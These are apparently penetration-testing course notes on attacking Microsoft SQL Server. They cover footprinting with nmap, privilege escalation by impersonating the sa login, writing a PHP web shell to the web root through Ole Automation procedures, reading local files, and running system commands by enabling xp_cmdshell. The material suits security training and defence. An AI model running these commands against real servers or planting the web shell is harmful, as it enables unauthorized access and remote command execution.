# MSSQL Attacks

### MSSQL Clients

* [SQL Server Management Studio](https://docs.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms?view=sql-server-ver15) (`SSMS`)
* Many other clients can be used to access a database running on MSSQL. Including but not limited to:

|                                                                                         |                                                                                                                      |                                       |                                         |                                                                                                             |
| --------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------- | ------------------------------------- | --------------------------------------- | ----------------------------------------------------------------------------------------------------------- |
| [mssql-cli](https://docs.microsoft.com/en-us/sql/tools/mssql-cli?view=sql-server-ver15) | [SQL Server PowerShell](https://docs.microsoft.com/en-us/sql/powershell/sql-server-powershell?view=sql-server-ver15) | [HeidiSQL](https://www.heidisql.com/) | [SQLPro](https://www.macsqlclient.com/) | [Impacket's mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py) |

### MSSQL Databases

| Default System Database | Description                                                                                                                                                                                            |
| ----------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `master`                | Tracks all system information for an SQL server instance                                                                                                                                               |
| `model`                 | Template database that acts as a structure for every new database created. Any setting changed in the model database will be reflected in any new database created after changes to the model database |
| `msdb`                  | The SQL Server Agent uses this database to schedule jobs & alerts                                                                                                                                      |
| `tempdb`                | Stores temporary objects                                                                                                                                                                               |
| `resource`              | Read-only database containing system objects included with SQL server                                                                                                                                  |

### Footprinting the Service

**NMAP MSSQL Script Scan**

```shell-session
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248
```

**MSSQL Ping in Metasploit**

```shell-session
msf6 auxiliary(scanner/mssql/mssql_ping) > set rhosts 10.129.201.248
```

**Connecting with Mssqlclient.py**

```shell-session
python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth
```

```shell-session
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL-01): Line 1: Changed database context to 'master'.
[*] INFO(SQL-01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands

SQL> select name from sys.databases

name                       
```

**Link to commands**

* https://learn.microsoft.com/en-us/sql/relational-databases/databases/view-a-list-of-databases-on-an-instance-of-sql-server?view=sql-server-ver16

```
SELECT name, database_id, create_date  FROM sys.databases;
```

**Connecting with sqlcmd**

```cmd-session
sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
```

* **Note:** When we authenticate to MSSQL using `sqlcmd` we can use the parameters `-y` (SQLCMDMAXVARTYPEWIDTH) and `-Y` (SQLCMDMAXFIXEDTYPEWIDTH) for better looking output. Keep in mind it may affect performance.
*

### Impersonate Existing Users with MSSQL

* SQL Server has a special permission, named `IMPERSONATE`, that allows the executing user to take on the permissions of another user or login until the context is reset or the session ends.

**Identify Users that We Can Impersonate**

```cmd-session
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO
```

```cmd-session
name
-----------------------------------------------
sa
ben
valentin
```

**Verifying our Current User and Role**

```cmd-session
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go
```

```cmd-session
-----------
julio                                                                                                                    

(1 rows affected)

-----------
          0

(1 rows affected)
```

* As the returned value `0` indicates, we do not have the sysadmin role, but we can impersonate the `sa` user

**Impersonating the SA User**

```cmd-session
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO
```

```cmd-session
-----------
sa

(1 rows affected)

-----------
          1

(1 rows affected)
```

### MSSQL - Enable Ole Automation Procedures

* To write files using `MSSQL`, we need to enable [Ole Automation Procedures](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option), which requires admin privileges, and then execute some stored procedures to create the file
* &#x20;[Ole Automation Procedures](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option)

```cmd-session
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
```

**MSSQL - Create a File**

```cmd-session
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```

### Read Local Files

* By default, `MSSQL` allows file read on any file in the operating system to which the account has read access. We can use the following SQL query:

**Read Local Files in MSSQL**

```cmd-session
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO
```

```cmd-session

BulkColumn

-----------------------------------------------------------------------------
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to hostnames. Each
# entry should be kept on an individual line. The IP address should

(1 rows affected)
```

### Execute Commands

* `Command execution` is one of the most desired capabilities when attacking common services because it allows us to control the operating system. If we have the appropriate privileges, we can use the SQL database to execute system commands or create the necessary elements to do it.
* `MSSQL` has a [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/database-engine-extended-stored-procedures-programming?view=sql-server-ver15) called [xp\_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) which allow us to execute system commands using SQL. Keep in mind the following about `xp_cmdshell`:
  * `xp_cmdshell` is a powerful feature and disabled by default. `xp_cmdshell` can be enabled and disabled by using the [Policy-Based Management](https://docs.microsoft.com/en-us/sql/relational-databases/security/surface-area-configuration) or by executing [sp\_configure](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option)
  * The Windows process spawned by `xp_cmdshell` has the same security rights as the SQL Server service account
  * `xp_cmdshell` operates synchronously. Control is not returned to the caller until the command-shell command is completed
* To execute commands using SQL syntax on MSSQL, use:

**XP\_CMDSHELL**

```cmd-session
1> xp_cmdshell 'whoami'
2> GO
```

```cmd-session
output
-----------------------------
no service\mssql$sqlexpress
NULL
(2 rows affected)
```

* If `xp_cmdshell` is not enabled, we can enable it, if we have the appropriate privileges, using the following command:

```mssql
EXECUTE sp_configure 'show advanced options', 1
GO
```

```mssql
-- To update the currently configured value for advanced options.  
RECONFIGURE
GO
```

```mssql
-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
GO  
```

```mssql
-- To update the currently configured value for this feature.  
RECONFIGURE
GO
```

* There are other methods to get command execution, such as adding [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server), [CLR Assemblies](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration), [SQL Server Agent Jobs](https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15), and [external scripts](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql).
* However, besides those methods there are also additional functionalities that can be used like the `xp_regwrite` command that is used to elevate privileges by creating new entries in the Windows registry
